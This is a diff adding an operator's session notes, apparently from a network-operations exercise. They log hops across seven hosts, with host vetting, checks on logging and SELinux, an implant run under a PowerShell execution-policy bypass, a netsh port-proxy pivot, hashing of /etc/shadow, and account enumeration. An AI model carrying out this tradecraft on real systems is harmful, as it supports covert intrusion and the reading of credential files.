@@ -1,0 +1,1126 @@
+####Notes for 17-08-22####
+
+>T1: 10.50.29.166
+->T2: 10.20.169.122
+-->T3: 10.20.169.238
+---> T4: 192.168.169.43
+----< T5: 192.168.169.111
+-----> T6: 192.168.169.220
+----> T7: 192.168.169.113
+
+Start: 1300Z
+End: 1900Z
+
+=========================
+T1: 10.50.29.166
+=========================
+X-----------------------
+
+2022-08-17 13:10:05-- ON
+
+2022-08-17 13:10:07-- start vetting
+
+[engineer4@ext-rtr ~]$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:21:12:c5 brd ff:ff:ff:ff:ff:ff
+    inet 10.20.169.33/24 brd 10.20.169.255 scope global dynamic eth0
+       valid_lft 67288sec preferred_lft 67288sec
+    inet6 fe80::f816:3eff:fe21:12c5/64 scope link 
+       valid_lft forever preferred_lft forever
+
+4 S root      1176     1  0  80   0 - 64910 poll_s Jun18 ?        00:06:38 /usr/sbin/rsyslogd -n
+5 S root       669     1  0  76  -4 - 13880 ep_pol Jun18 ?        00:00:05 /sbin/auditd
+
+[engineer4@ext-rtr ~]$ date; date -u
+Wed Aug 17 13:12:23 UTC 2022
+Wed Aug 17 13:12:23 UTC 2022
+
+*.* @@10.50.22.142:514
+###rsyslog still here###
+
+
+-rw-------. 1 root root               39008 Aug 17 13:11 /var/log/messages
+-rw-r--r--. 1 root root                 266 Aug 17 13:11 /run/systemd/users/1020
+-rw-r--r--. 1 root root                 302 Aug 17 13:11 /run/systemd/sessions/1513
+-rw-rw-r--. 1 root utmp              332544 Aug 17 13:11 /var/log/wtmp
+-rw-r--r--. 1 root root              299300 Aug 17 13:11 /var/log/lastlog
+-rw-rw-r--. 1 root utmp                9600 Aug 17 13:11 /run/utmp
+-rw-------. 1 root root                 125 Aug 17 13:13 /var/lib/rsyslog/imjournal.state
+-rw-------. 1 root root             6505007 Aug 17 13:13 /var/log/audit/audit.log
+-rw-r-----+ 1 root systemd-journal 16777216 Aug 17 13:13 /run/log/journal/65113b1a0d2f6087d515e6a8cd0ee7ef/system.journal
+-rw-------. 1 root root              957844 Aug 17 13:13 /var/log/secure
+
+[engineer4@ext-rtr ~]$ sestatus
+SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   enforcing
+Mode from config file:          enforcing
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+
+
+2022-08-17 13:16:00-- done vetting
+
+
+2022-08-17 17:32:36-- OFF
+
+
+------------------------X
+=========================
+
+=========================
+T2: 10.20.169.122
+=========================
+X-----------------------
+
+2022-08-17 13:17:37-- ON
+
+2022-08-17 13:17:39-- start vetting
+
+caisson4@STORAGE1 C:\Users\caisson4>ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : STORAGE1
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : vta
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : vta
+   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter
+   Physical Address. . . . . . . . . : FA-16-3E-54-0A-D5
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::7954:fd79:4621:888f%6(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.20.169.122(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Saturday, June 18, 2022 1:01:32 AM
+   Lease Expires . . . . . . . . . . : Thursday, August 18, 2022 5:05:26 AM
+   Default Gateway . . . . . . . . . : 10.20.169.1
+   DHCP Server . . . . . . . . . . . : 10.20.169.2
+   DHCPv6 IAID . . . . . . . . . . . : 117052990
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-98-76-42-FA-16-3E-54-0A-D5
+   DNS Servers . . . . . . . . . . . : 10.50.255.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+caisson4@STORAGE1 C:\Users\caisson4>date /t
+Wed 08/17/2022
+
+caisson4@STORAGE1 C:\Users\caisson4>time /t
+01:18 PM
+
+caisson4@STORAGE1 C:\Users\caisson4>query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ administrator         console             1  Active      none   8/17/2022 1:11 PM
+
+taskhostw.exe                 1700 Console                    1     10,044 K Unknown         STORAGE1\Administrator
+       0:00:00 N/A
+svchost.exe                   3444 Services                   0      9,544 K Unknown         NT AUTHORITY\SYSTEM
+       0:00:00 N/A
+cmd.exe                       3148 Console                    1      3,900 K Unknown         STORAGE1\Administrator
+       0:00:00 N/A
+conhost.exe                   2856 Console                    1     13,620 K Unknown         STORAGE1\Administrator
+       0:00:01 N/A
+powershell.exe                5072 Console                    1     90,180 K Unknown         STORAGE1\Administrator
+
+2022-08-17 13:29:53-- done vetting
+
+
+
+
+2022-08-17 17:29:15-- OFF
+
+
+------------------------X
+=========================
+
+=========================
+T3: 10.20.169.238
+=========================
+X-----------------------
+
+2022-08-17 13:29:58-- ON
+
+2022-08-17 13:30:01-- start vetting
+
+NOC_Admin4@Vyos1:~$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether fa:16:3e:6c:c0:57 brd ff:ff:ff:ff:ff:ff
+    inet 10.20.169.238/24 brd 10.20.169.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe6c:c057/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether fa:16:3e:90:b0:db brd ff:ff:ff:ff:ff:ff
+    inet 192.168.169.206/24 brd 192.168.169.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe90:b0db/64 scope link 
+       valid_lft forever preferred_lft forever
+NOC_Admin4@Vyos1:~$ date; date -u
+Wed Aug 17 13:29:26 UTC 2022
+Wed Aug 17 13:29:26 UTC 2022
+
+-rw-r--r-- 1 root        root       779 Aug 17 13:17 /var/lib/logrotate/status
+-rw------- 1 NOC_Admin16 users     4248 Aug 17 13:27 /home/NOC_Admin16/.bash_history
+-rw------- 1 NOC_Admin18 users     4894 Aug 17 13:30 /home/NOC_Admin18/.bash_history
+-rw------- 1 NOC_Admin17 users     4371 Aug 17 13:31 /home/NOC_Admin17/.bash_history
+-rw------- 1 NOC_Admin12 users     8277 Aug 17 13:31 /home/NOC_Admin12/.bash_history
+-rw------- 1 NOC_Admin4  users    37929 Aug 17 13:31 /home/NOC_Admin4/.bash_history
+-rw-rw-r-- 1 root        utmp     13056 Aug 17 13:31 /var/run/utmp
+-rw-rw-r-- 1 root        utmp     38784 Aug 17 13:31 /var/log/wtmp
+-rw-rw-r-- 1 root        utmp    299300 Aug 17 13:31 /var/log/lastlog
+-rw-r----- 1 root        adm   61880088 Aug 17 13:31 /var/log/auth.log
+
+
+2022-08-17 13:41:48-- done vetting
+
+2022-08-17 17:29:00-- OFF
+
+------------------------X
+=========================
+
+=========================
+T4: 192.168.169.43
+=========================
+X-----------------------
+
+2022-08-17 13:41:52-- ON
+
+2022-08-17 13:41:54-- start vetting
+
+[user4@desktop-admin1 ~]$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:05:2c:d6 brd ff:ff:ff:ff:ff:ff
+    inet 10.123.169.5/24 brd 10.123.169.255 scope global dynamic eth0
+       valid_lft 63995sec preferred_lft 63995sec
+    inet6 fe80::f816:3eff:fe05:2cd6/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:cd:5d:1c brd ff:ff:ff:ff:ff:ff
+    inet 192.168.169.43/24 brd 192.168.169.255 scope global dynamic eth1
+       valid_lft 62522sec preferred_lft 62522sec
+    inet6 fe80::f816:3eff:fecd:5d1c/64 scope link 
+       valid_lft forever preferred_lft forever
+
+4 S root      1183     1  0  80   0 - 101755 poll_s Jun18 ?       00:06:29 /usr/sbin/rsyslogd -n
+
+[user4@desktop-admin1 ~]$ sudo ls -latr /root
+total 48
+-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
+-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
+-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc
+-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
+-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
+dr-xr-xr-x. 17 root root  224 Aug  8  2019 ..
+-rw-------.  1 root root 6577 Aug  8  2019 original-ks.cfg
+-rw-------.  1 root root 6921 Aug  8  2019 anaconda-ks.cfg
+drwx------.  2 root root   29 Feb 11  2022 .ssh
+drwxr-----.  3 root root   19 Feb 12  2022 .pki
+drwxr-xr-x.  6 root root 4096 May 16 12:22 firetools
+-rw-------.  1 root root   35 May 16 14:56 .lesshst
+-rw-------.  1 root root  147 May 17 19:07 .bash_history
+dr-xr-x---.  5 root root  215 May 17 19:07 .
+
+[user4@desktop-admin1 ~]$ ls -latr .
+total 24
+-rw-r--r--.  1 user4 wheel  231 Oct 30  2018 .bashrc
+-rw-r--r--.  1 user4 wheel  193 Oct 30  2018 .bash_profile
+-rw-r--r--.  1 user4 wheel   18 Oct 30  2018 .bash_logout
+drwxr-xr-x. 26 root  root  4096 Feb 11  2022 ..
+-rw-r-----.  1 user4 wheel    0 Mar 15 15:28 lynis.log
+-rw-r-----.  1 user4 wheel  603 Mar 16 14:14 lynis-report.dat
+-rw-------.  1 user4 wheel 2167 Aug 16 18:19 .bash_history
+drwx------.  2 user4 wheel  124 Aug 16 18:19 .
+
+[user4@desktop-admin1 ~]$ date; date -u
+Wed Aug 17 13:45:09 UTC 2022
+Wed Aug 17 13:45:09 UTC 2022
+
+-rw-r-----.  1 root   root      41060 Aug 17 13:00 lynis-report.dat
+-rw-r-----.  1 root   root     291322 Aug 17 13:00 lynis.log
+-rw-------.  1 root   root     113553 Aug 17 13:00 maillog
+-rw-r--r--.  1 root   root      31816 Aug 17 13:01 cron
+-rw-------.  1 root   root      54845 Aug 17 13:41 messages
+-rw-rw-r--.  1 root   utmp     110976 Aug 17 13:41 wtmp
+-rw-r--r--.  1 root   root     299300 Aug 17 13:41 lastlog
+-rw-------.  1 root   root   11808528 Aug 17 13:45 secure
+
+[user4@desktop-admin1 ~]$ cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+0 * * * * root    /bin/lynis audit system
+
+-rw-rw-r--. 1 root utmp              111360 Aug 17 13:46 /var/log/wtmp
+-rw-r--r--. 1 root root              299300 Aug 17 13:46 /var/log/lastlog
+-rw-rw-r--. 1 root utmp                9600 Aug 17 13:46 /run/utmp
+-rw-------. 1 root root             6893435 Aug 17 13:47 /var/log/audit/audit.log
+-rw-------. 1 root root                 126 Aug 17 13:47 /var/lib/rsyslog/imjournal.state
+-rw-------. 1 root root            11816051 Aug 17 13:47 /var/log/secure
+-rw-r-----+ 1 root systemd-journal 25165824 Aug 17 13:47 /run/log/journal/65113b1a0d2f6087d515e6a8cd0ee7ef/system.journal
+
+[user4@desktop-admin1 ~]$ sestatus
+SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   enforcing
+Mode from config file:          enforcing
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+
+4 S root      1183     1  0  80   0 - 101755 poll_s Jun18 ?       00:06:29 /usr/sbin/rsyslogd -n
+
+2022-08-17 13:53:44-- done vetting
+
+2022-08-17 14:03:44-- collect
+
+REMOTE
+[user4@desktop-admin1 ~]$ sudo md5sum /etc/shadow
+61b31d0e28547761ac2435490072d77a  /etc/shadow
+[user4@desktop-admin1 ~]$ md5sum /etc/passwd
+822a266557f1735712b6f557edd44e75  /etc/passwd
+[user4@desktop-admin1 ~]$ md5sum /etc/group
+f1340eda011f3c07cbd761ee42552804  /etc/group
+[user4@desktop-admin1 ~]$ md5sum /var/log/lynis.log
+md5sum: /var/log/lynis.log: Permission denied
+[user4@desktop-admin1 ~]$ sudo md5sum /var/log/lynis.log
+821cd1ac8c91aef17fcc53520c282154  /var/log/lynis.log
+
+LOCAL
+f1340eda011f3c07cbd761ee42552804  group
+821cd1ac8c91aef17fcc53520c282154  lynis.log
+822a266557f1735712b6f557edd44e75  passwd
+61b31d0e28547761ac2435490072d77a  shadow
+
+2022-08-17 14:15:23-- done collection
+
+
+2022-08-17 17:27:24-- OFF
+
+
+------------------------X
+=========================
+
+=========================
+T5: 192.168.169.111
+=========================
+2022-08-17 16:00:11-- X-----------------------
+
+
+2022-08-17 14:15:29-- ON
+
+2022-08-17 14:15:31-- start vetting
+
+###POWERSHELL####
+
+PS C:\implant> ipconfig /all
+ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DESKTOP-USER11
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : vta
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : vta
+   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter
+   Physical Address. . . . . . . . . : FA-16-3E-0F-32-C9
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::2c24:2ebf:4f9a:e6bd%3(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.169.111(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Wednesday, August 10, 2022 12:09:48 AM
+   Lease Expires . . . . . . . . . . : Thursday, August 18, 2022 8:38:19 AM
+   Default Gateway . . . . . . . . . : 192.168.169.1
+   DHCP Server . . . . . . . . . . . : 192.168.169.2
+   DHCPv6 IAID . . . . . . . . . . . : 117052990
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-98-76-51-FA-16-3E-0F-32-C9
+   DNS Servers . . . . . . . . . . . : 10.50.255.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+
+PS C:\implant> date /t
+date /t
+Get-Date : Cannot bind parameter 'Date'. Cannot convert value "/t" to type "System.DateTime". Error: "String was not 
+recognized as a valid DateTime."
+At line:1 char:6
++ date /t
++      ~~
+    + CategoryInfo          : InvalidArgument: (:) [Get-Date], ParameterBindingException
+    + FullyQualifiedErrorId : CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.GetDateCommand
+ 
+PS C:\implant> time /t
+time /t
+time : The term 'time' is not recognized as the name of a cmdlet, function, script file, or operable program. Check 
+the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ time /t
++ ~~~~
+    + CategoryInfo          : ObjectNotFound: (time:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+powershell.exe                1428 Console                    1     56,564 K Running         DESKTOP-USER11\Administrator                            0:00:02 Administrator: C:\implant\T10implant.exe    
+
+mstsc.exe                     5992 Console                    1     69,732 K Running         DESKTOP-USER11\Administrator                            0:00:03 Workstation17 - Remote Desktop Connection 
+notepad.exe                   1192 Console                    1     17,156 K Running         DESKTOP-USER11\Administrator                            0:00:02 Loop_Launcher - Notepad  
+PaintStudio.View.exe          4104 Console                    1      1,236 K Running         DESKTOP-USER11\Administrator                            0:00:00 Paint 3D   
+
+
+CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; &amp; 'C:\implant\Loop_Launcher.ps1'"
+
+CommandLine="C:\Windows\System32\notepad.exe" "C:\implant\Loop_Launcher.ps1"
+
+C:\implant>certutil -hashfile C:\Windows\System32\notepad.exe MD5
+certutil -hashfile C:\Windows\System32\notepad.exe MD5
+MD5 hash of C:\Windows\System32\notepad.exe:
+e92d3a824a0578a50d2dd81b5060145f
+CertUtil: -hashfile command completed successfully.
+
+type C:\implant\Loop_Launcher.ps1
+
+C:\implant>certutil -hashfile "C:\Program Files\WindowsApps\Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe\PaintStudio.View.exe" MD5
+certutil -hashfile "C:\Program Files\WindowsApps\Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe\PaintStudio.View.exe" MD5
+MD5 hash of C:\Program Files\WindowsApps\Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe\PaintStudio.View.exe:
+7e11b5f9f7a7fe66809577ec83971972
+CertUtil: -hashfile command completed successfully.
+
+C:\implant>certutil -hashfile  "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" MD5
+certutil -hashfile  "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" MD5
+MD5 hash of C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe:
+a5cae91f1031002e81e2442aa07900d9
+CertUtil: -hashfile command completed successfully.
+
+2022-08-17 14:46:57-- done vetting
+
+C:\implant>certutil -hashfile C:\Windows\SysWOW64\net1.exe MD5
+certutil -hashfile C:\Windows\SysWOW64\net1.exe MD5
+MD5 hash of C:\Windows\SysWOW64\net1.exe:
+2efe6ed4c294ab8a39eb59c80813fec1
+
+2022-08-17 14:47:19-- netsh portproxy made 
+
+2022-08-17 15:50:21-- netsh portproxy deleted 
+
+2022-08-17 15:55:09-- OFF
+
+
+
+
+------------------------X
+=========================
+
+=========================
+T6: 192.168.169.220
+=========================
+X-----------------------
+
+
+2022-08-17 14:59:01-- ON
+
+2022-08-17 14:59:03-- start vetting
+
+[user4@desktop-user12 ~]$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:74:33:3e brd ff:ff:ff:ff:ff:ff
+    inet 192.168.169.220/24 brd 192.168.169.255 scope global dynamic eth0
+       valid_lft 85217sec preferred_lft 85217sec
+    inet6 fe80::f816:3eff:fe74:333e/64 scope link 
+       valid_lft forever preferred_lft forever
+
+4 S root      1187     1  0  80   0 - 59783 poll_s Jun18 ?        00:06:01 /usr/sbin/rsyslogd -n
+5 S root       662     1  0  76  -4 - 13880 ep_pol Jun18 ?        00:00:05 /sbin/auditd
+
+[user4@desktop-user12 ~]$ date; date -u
+Wed Aug 17 15:01:53 UTC 2022
+Wed Aug 17 15:01:53 UTC 2022
+
+[user4@desktop-user12 ~]$ uname -a
+Linux desktop-user12 3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+rw-rw-r--. 1 root utmp              54144 Aug 17 14:58 /var/log/wtmp
+-rw-r--r--. 1 root root             299300 Aug 17 14:58 /var/log/lastlog
+-rw-rw-r--. 1 root utmp               2304 Aug 17 14:58 /run/utmp
+-rw-r--r--. 1 root root              26153 Aug 17 15:01 /var/log/cron
+-rw-------. 1 root root              22452 Aug 17 15:01 /var/log/messages
+-rw-------. 1 root root                125 Aug 17 15:05 /var/lib/rsyslog/imjournal.state
+-rw-------. 1 root root             975249 Aug 17 15:05 /var/log/audit/audit.log
+-rw-------. 1 root root              12721 Aug 17 15:05 /var/log/secure
+-rw-r-----+ 1 root systemd-journal 8388608 Aug 17 15:05 /run/log/journal/65113b1a0d2f6087d515e6a8cd0ee7ef/system.journal
+
+[user4@desktop-user12 ~]$ sestatus
+SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   enforcing
+Mode from config file:          enforcing
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+
+2022-08-17 15:24:13-- done vetting
+
+2022-08-17 15:24:16-- getting more info
+
+2022-08-17 15:24:24-- catalogging user accounts
+
+[user4@desktop-user12 ~]$ ls -latr ..
+total 4
+drwxr-xr-x.  4 root    root    40 Mar 16 12:41 ..
+drwx------.  2 user21  wheel   62 Mar 16 12:42 user21
+drwx------.  2 user22  wheel   62 Mar 16 12:42 user22
+drwx------.  2 radicle wheel   62 Mar 16 12:42 radicle
+drwxr-xr-x. 26 root    root  4096 Mar 16 12:42 .
+drwx------.  2 user20  wheel   62 May 17 18:35 user20
+drwx------.  2 user19  wheel   62 May 17 18:35 user19
+drwx------.  2 user18  wheel   62 May 17 18:35 user18
+drwx------.  2 user17  wheel   62 May 17 18:35 user17
+drwx------.  2 user16  wheel   74 May 17 18:35 user16
+drwx------.  2 user15  wheel   62 May 17 18:35 user15
+drwx------.  2 user14  wheel   62 May 17 18:35 user14
+drwx------.  2 user13  wheel   62 May 17 18:35 user13
+drwx------.  2 user12  wheel   62 May 17 18:35 user12
+drwx------.  2 user11  wheel   62 May 17 18:35 user11
+drwx------.  2 user10  wheel   62 May 17 18:35 user10
+drwx------.  2 user1   wheel   62 May 17 18:35 user1
+drwx------.  2 user9   wheel   62 May 17 18:35 user9
+drwx------.  2 user8   wheel   62 May 17 18:35 user8
+drwx------.  2 user7   wheel   62 May 17 18:35 user7
+drwx------.  2 user6   wheel   62 May 17 18:35 user6
+drwx------.  2 user5   wheel   62 May 17 18:35 user5
+drwx------.  2 user4   wheel   62 May 17 18:35 user4
+drwx------.  2 user3   wheel   62 May 17 18:35 user3
+drwx------.  2 user2   wheel   62 May 17 18:35 user2
+drwx------.  2 user23  wheel   83 May 17 19:03 user23
+
+[user4@desktop-user12 ~]$ lastlog
+Username         Port     From             Latest
+root             pts/0                     Tue May 17 19:02:37 +0000 2022
+bin                                        **Never logged in**
+daemon                                     **Never logged in**
+adm                                        **Never logged in**
+lp                                         **Never logged in**
+sync                                       **Never logged in**
+shutdown                                   **Never logged in**
+halt                                       **Never logged in**
+mail                                       **Never logged in**
+operator                                   **Never logged in**
+games                                      **Never logged in**
+ftp                                        **Never logged in**
+nobody                                     **Never logged in**
+systemd-network                            **Never logged in**
+dbus                                       **Never logged in**
+polkitd                                    **Never logged in**
+rpc                                        **Never logged in**
+rpcuser                                    **Never logged in**
+nfsnobody                                  **Never logged in**
+sshd                                       **Never logged in**
+postfix                                    **Never logged in**
+chrony                                     **Never logged in**
+centos                                     **Never logged in**
+user1            pts/1    192.168.169.111  Tue May 17 15:06:27 +0000 2022
+user2            pts/5    192.168.169.43   Wed Aug 17 15:19:47 +0000 2022
+user3            pts/5    192.168.169.111  Tue May 17 16:00:17 +0000 2022
+user4            pts/1    192.168.169.111  Wed Aug 17 14:58:46 +0000 2022
+user5            pts/4    192.168.169.111  Tue May 17 15:15:12 +0000 2022
+user6            pts/2    192.168.169.111  Tue May 17 17:12:22 +0000 2022
+user7            pts/7    192.168.169.111  Wed Mar 16 15:29:05 +0000 2022
+user8            pts/2    192.168.169.111  Tue May 17 16:42:41 +0000 2022
+user9            pts/3    192.168.169.111  Tue May 17 15:59:17 +0000 2022
+user10           pts/4    192.168.169.111  Tue May 17 16:27:38 +0000 2022
+user11           pts/1    192.168.169.111  Tue May 17 16:12:38 +0000 2022
+user12           pts/5    192.168.169.111  Tue May 17 17:15:37 +0000 2022
+user13           pts/4    192.168.169.111  Tue May 17 17:14:01 +0000 2022
+user14           pts/6    192.168.169.111  Tue May 17 15:34:06 +0000 2022
+user15           pts/2    192.168.169.111  Tue May 17 15:32:36 +0000 2022
+user16           pts/7    192.168.169.111  Tue May 17 15:36:06 +0000 2022
+user17           pts/2    192.168.169.111  Wed Aug 17 15:08:51 +0000 2022
+user18           pts/2    192.168.169.111  Tue May 17 14:57:39 +0000 2022
+user19           pts/3    192.168.169.111  Wed Aug 17 15:10:13 +0000 2022
+user20           pts/4    192.168.169.111  Wed Aug 17 15:19:36 +0000 2022
+user21                                     **Never logged in**
+user22                                     **Never logged in**
+user23           pts/0    192.168.169.111  Wed Aug 17 13:18:47 +0000 2022
+radicle                                    **Never logged in**
+
+[user4@desktop-user12 ~]$ who
+user23   pts/0        2022-08-17 13:18 (192.168.169.111)
+user4    pts/1        2022-08-17 14:58 (192.168.169.111)
+user17   pts/2        2022-08-17 15:08 (192.168.169.111)
+user19   pts/3        2022-08-17 15:10 (192.168.169.111)
+user20   pts/4        2022-08-17 15:19 (192.168.169.111)
+user2    pts/5        2022-08-17 15:19 (192.168.169.43)
+
+[user4@desktop-user12 ~]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:995::/var/lib/chrony:/sbin/nologin
+centos:x:1000:1000:Cloud User:/home/centos:/bin/bash
+user1:x:1001:10::/home/useraccounts/user1:/bin/bash
+user2:x:1002:10::/home/useraccounts/user2:/bin/bash
+user3:x:1003:10::/home/useraccounts/user3:/bin/bash
+user4:x:1004:10::/home/useraccounts/user4:/bin/bash
+user5:x:1005:10::/home/useraccounts/user5:/bin/bash
+user6:x:1006:10::/home/useraccounts/user6:/bin/bash
+user7:x:1007:10::/home/useraccounts/user7:/bin/bash
+user8:x:1008:10::/home/useraccounts/user8:/bin/bash
+user9:x:1009:10::/home/useraccounts/user9:/bin/bash
+user10:x:1010:10::/home/useraccounts/user10:/bin/bash
+user11:x:1011:10::/home/useraccounts/user11:/bin/bash
+user12:x:1012:10::/home/useraccounts/user12:/bin/bash
+user13:x:1013:10::/home/useraccounts/user13:/bin/bash
+user14:x:1014:10::/home/useraccounts/user14:/bin/bash
+user15:x:1015:10::/home/useraccounts/user15:/bin/bash
+user16:x:1016:10::/home/useraccounts/user16:/bin/bash
+user17:x:1017:10::/home/useraccounts/user17:/bin/bash
+user18:x:1018:10::/home/useraccounts/user18:/bin/bash
+user19:x:1019:10::/home/useraccounts/user19:/bin/bash
+user20:x:1020:10::/home/useraccounts/user20:/bin/bash
+user21:x:1021:10::/home/useraccounts/user21:/bin/bash
+user22:x:1022:10::/home/useraccounts/user22:/bin/bash
+user23:x:1023:10::/home/useraccounts/user23:/bin/bash
+radicle:x:1024:10::/home/useraccounts/radicle:/bin/bash
+
+
